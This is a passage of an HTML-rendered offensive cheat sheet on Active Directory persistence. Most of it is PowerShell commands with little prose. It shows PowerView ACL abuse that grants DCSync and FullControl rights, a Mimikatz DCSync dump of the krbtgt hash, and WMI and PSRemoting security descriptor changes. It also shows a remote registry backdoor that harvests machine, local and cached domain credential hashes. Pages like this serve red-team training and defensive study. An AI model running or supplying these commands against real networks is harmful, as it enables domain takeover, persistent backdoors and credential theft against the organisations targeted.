</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="nb">Get-ObjectAcl</span> <span class="n">-DistinguishedName</span> <span class="s2">&quot;dc=domain,dc=local&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?{(</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-match</span> <span class="s2">&quot;targetuser&quot;</span><span class="p">)</span> <span class="o">-and</span> <span class="p">((</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectType</span> <span class="o">-match</span> <span class="s1">&#39;replication&#39;</span><span class="p">)</span> <span class="o">-or</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-match</span> <span class="s1">&#39;GenericAll&#39;</span><span class="p">))}</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="c"># ADD OBJECT ACL</span>
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="nb">Add-ObjectAcl</span> <span class="n">-TargetDistinguishedName</span> <span class="s2">&quot;dc=domain,dc=local&quot;</span> <span class="n">-PrincipalSamAccountName</span> <span class="n">targetuser</span> <span class="n">-Rights</span> <span class="n">DCSync</span> <span class="n">-Verbose</span>
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="c"># DCSYNC</span>
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="nb">Get-ObjectAcl</span> <span class="n">-DistinguishedName</span> <span class="s2">&quot;dc=domain,dc=local&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?{(</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-match</span> <span class="s2">&quot;targetuser&quot;</span><span class="p">)</span> <span class="o">-and</span> <span class="p">((</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectType</span> <span class="o">-match</span> <span class="s1">&#39;replication&#39;</span><span class="p">)</span> <span class="o">-or</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ActiveDirectoryRights</span> <span class="o">-match</span> <span class="s1">&#39;GenericAll&#39;</span><span class="p">))}</span>
</span></code></pre></div>
<h4 id="rights-abuse">Rights Abuse</h4>
<ul>
<li>Add FullControl rights
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nb">Add-ObjectAcl</span> <span class="n">-TargetDistinguishedName</span> <span class="s1">&#39;DC=lab,DC=domain,DC=local&#39;</span> <span class="n">-PrincipalSamAccountName</span> <span class="n">john</span> <span class="n">-Rights</span> <span class="n">All</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Using ActiveDirectory Module and Set-ADACL
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">Set-ADACL</span> <span class="n">-DistinguishedName</span> <span class="s1">&#39;DC=lab,DC=domain,DC=local&#39;</span> <span class="n">-Principal</span> <span class="n">john</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Add rights for DCSync
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="nb">Add-ObjectAcl</span> <span class="n">-TargetDistinguishedName</span> <span class="s1">&#39;DC=lab,DC=domain,DC=local&#39;</span> <span class="n">-PrincipalSamAccountName</span> <span class="n">bob</span> <span class="n">-Rights</span> <span class="n">DCSync</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Using ActiveDirectory Module and Set-ADACL
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">Set-ADACL</span> <span class="n">-DistinguishedName</span> <span class="s1">&#39;DC=lab,DC=domain,DC=local&#39;</span> <span class="n">-Principal</span> <span class="n">bob</span> <span class="n">-GUIDRight</span> <span class="n">DCSync</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Execute DCSync
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;lsadump::dcsync /user:domain\krbtgt&quot;&#39;</span>
</span></code></pre></div></li>
</ul>
<hr />
<h4 id="security-descriptors">SECURITY DESCRIPTORS</h4>
<ul>
<li>
<p>ACLs can be modified to allow non-admin users access to securable objects</p>
</li>
<li>
<p>WMI</p>
<ul>
<li>On local machine for jane
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">Set-RemoteWMI</span> <span class="n">-UserName</span> <span class="n">jane</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>On remote machine for jane without explicit credentials
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">Set-RemoteWMI</span> <span class="n">-UserName</span> <span class="n">jame</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-namespace</span> <span class="s1">&#39;root\cimv2&#39;</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>On remote machine with explicit credentials
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">Set-RemoteWMI</span> <span class="n">-UserName</span> <span class="n">jane</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Credential</span> <span class="n">Administrator</span> <span class="n">-namespace</span> <span class="s1">&#39;root\cimv2&#39;</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>On remote machine remove permissions
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="nb">Set-RemoteWMI</span> <span class="n">-UserName</span> <span class="n">jane</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-namespace</span> <span class="s1">&#39;root\cimv2&#39;</span> <span class="n">-Remove</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
</ul>
</li>
<li>
<p>PSREMOTE</p>
<ul>
<li>On local machine for joe
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="nb">Set-RemotePSRemoting</span> <span class="n">-UserName</span> <span class="n">joe</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>On remote machine for joe without credentials
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">Set-RemotePSRemoting</span> <span class="n">-UserName</span> <span class="n">joe</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>On remote machine, remove the permissions
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">Set-RemotePSRemoting</span> <span class="n">-UserName</span> <span class="n">joe</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Remove</span>
</span></code></pre></div></li>
</ul>
</li>
<li>
<p>REMOTE REGISTRY</p>
<ul>
<li>Using DAMP, with admin privs on remote machine
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="nb">Add-RemoteRegBackdoor</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Trustee</span> <span class="n">jack</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>As jack, retrieve machine account hash
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nb">Get-RemoteMachineAccountHash</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Retrieve local account hash
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nb">Get-RemoteLocalAccountHash</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>Retrieve domain cached credentials
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="nb">Get-RemoteCachedCredential</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
</ul>
</li>
</ul>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/persistence.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>